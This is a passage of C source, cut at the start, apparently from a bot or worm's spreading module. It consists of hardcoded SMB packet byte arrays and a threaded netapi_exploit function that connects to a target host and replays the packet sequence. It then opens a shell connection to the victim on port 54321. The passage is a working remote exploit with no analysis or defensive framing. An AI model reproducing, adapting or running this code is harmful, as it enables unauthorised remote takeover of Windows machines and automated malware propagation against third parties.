0x52, 0x66, 0x79 };

char peer0_13[] = {
0x00, 0x00, 0x01, 0x57, 0xff, 0x53, 0x4d, 0x42, 
0x2f, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x0e, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x40, 0x30, 0x02, 0x00, 0x00, 0xff, 
0xff, 0xff, 0xff, 0x08, 0x00, 0x18, 0x01, 0x00, 
0x00, 0x18, 0x01, 0x3f, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x18, 0x01, 0x05, 0x00, 0x00, 0x00, 0x10, 
0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0x00, 0x52, 0x36, 0x36, 0x37, 0x4e, 
0x54, 0x6f, 0x48, 0x76, 0x51, 0x32, 0x63, 0x68, 
0x67, 0x36, 0x68, 0x43, 0x39, 0x54, 0x46, 0x4b, 
0x67, 0x79, 0x56, 0x57, 0x53, 0x45, 0x39, 0x42, 
0x4a, 0x65, 0x4f, 0x57, 0x73, 0x42, 0x6b, 0x39, 
0x52, 0x76, 0x31, 0x56, 0x42, 0x6e, 0x42, 0x70, 
0x75, 0x42, 0x46, 0x58, 0x35, 0x48, 0x46, 0x62, 
0x4a, 0x78, 0x6d, 0x33, 0x53, 0x50, 0x34, 0x30, 
0x7a, 0x76, 0x46, 0x6c, 0x4f, 0x54, 0x37, 0x6a, 
0x4a, 0x45, 0x59, 0x54, 0x6f, 0x69, 0x62, 0x36, 
0x65, 0x57, 0x6a, 0x32, 0x44, 0x63, 0x31, 0x65, 
0x4b, 0x36, 0x59, 0x55, 0x33, 0x32, 0x38, 0x78, 
0x5a, 0x64, 0x42, 0x75, 0x56, 0x79, 0x52, 0x70, 
0x36, 0x33, 0x47, 0x45, 0x7a, 0x31, 0x72, 0x36, 
0x51, 0x50, 0x35, 0x70, 0x4f, 0x58, 0x59, 0x31, 
0x75, 0x32, 0x39, 0x70, 0x74, 0x50, 0x41, 0x6a, 
0x34, 0x65, 0x7a, 0x78, 0x69, 0x50, 0x59, 0x0a, 
0x08, 0x02, 0x00, 0x4a, 0x52, 0x57, 0x6c, 0x39, 
0x50, 0x77, 0x38, 0x04, 0x08, 0x02, 0x00, 0x32, 
0x37, 0x49, 0x49, 0x56, 0x6d, 0x6f, 0x55, 0x68, 
0x56, 0x69, 0x51, 0x41, 0x35, 0x43, 0x4c, 0x47, 
0x6b, 0x4f, 0x45, 0x30, 0x51, 0x36, 0x52, 0x30, 
0x6f, 0x64, 0x74, 0x78, 0x65, 0x32, 0x70, 0x04, 
0x08, 0x02, 0x00, 0x35, 0x79, 0x78, 0x32, 0x78, 
0x70, 0x38, 0x35, 0x04, 0x08, 0x02, 0x00, 0x51, 
0x67, 0x39, 0x36, 0x4a, 0x71, 0x65, 0x72, 0x56, 
0x55, 0x47, 0x58, 0x53, 0x58, 0x59, 0x4f, 0x61, 
0x61, 0x7a, 0x47, 0x62, 0x48, 0x56, 0x61, 0x73, 
0x33, 0x4d, 0x4b, 0x34, 0x42, 0x39, 0x79, 0x00, 
0x00, 0xbf, 0xf9, 0x78, 0x00, 0x00, 0x00, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0xb4, 0xee, 0x7b, 
0x00, 0x00, 0x00 };

char peer0_14[] = {
0x00, 0x00, 0x00, 0x66, 0xff, 0x53, 0x4d, 0x42, 
0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x10, 0x00, 0x00, 0x1c, 
0x00, 0x00, 0x04, 0xe0, 0xff, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x4a, 0x00, 0x1c, 0x00, 0x4a, 0x00, 0x02, 
0x00, 0x26, 0x00, 0x00, 0x40, 0x23, 0x00, 0x5c, 
0x50, 0x49, 0x50, 0x45, 0x5c, 0x00, 0x05, 0x00, 
0x00, 0x02, 0x10, 0x00, 0x00, 0x00, 0x1c, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x1f, 0x00, 0x00, 0x00, 
0x00, 0x00 };
#pragma warning(default : 4305)
#pragma warning(default : 4101)
#pragma warning(default : 4309)

unsigned int __stdcall netapi_exploit(void *param)
{
	int fd;
	char repbf[20000];
	struct sockaddr_in target;
	struct exploits exploit = *(struct exploits *)param;
	struct exploits *pexploit = (struct exploits *)param;
	pexploit->gotinfo = true;
	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		_endthreadex(0);
		return 0;
	}
	target.sin_family = AF_INET;
	target.sin_addr.s_addr = exploit.ip;
	target.sin_port = htons(exploit.port);
	memset(target.sin_zero, 0, 8);
	
	if(connect(fd, (struct sockaddr *)&target, sizeof(target)) == -1)
	{
		_endthreadex(0);
		return 0;
	}
	sendto(fd,peer0_0,sizeof(peer0_0),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_1,sizeof(peer0_1),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_2,sizeof(peer0_2),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_3,sizeof(peer0_3),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_4,sizeof(peer0_4),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_5,sizeof(peer0_5),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_6,sizeof(peer0_6),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_7,sizeof(peer0_7),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_8,sizeof(peer0_8),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_9,sizeof(peer0_9),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_10,sizeof(peer0_10),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_11,sizeof(peer0_11),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_12,sizeof(peer0_12),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_13,sizeof(peer0_13),0,(struct sockaddr *)&target,sizeof(target));
	recv(fd, repbf, sizeof(repbf), 0);
	sendto(fd,peer0_14,sizeof(peer0_14),0,(struct sockaddr *)&target,sizeof(target));
	shell_connect(exploit.ip, 54321);
	closesocket(fd);
	_endthreadex(0);
	return 0;
}
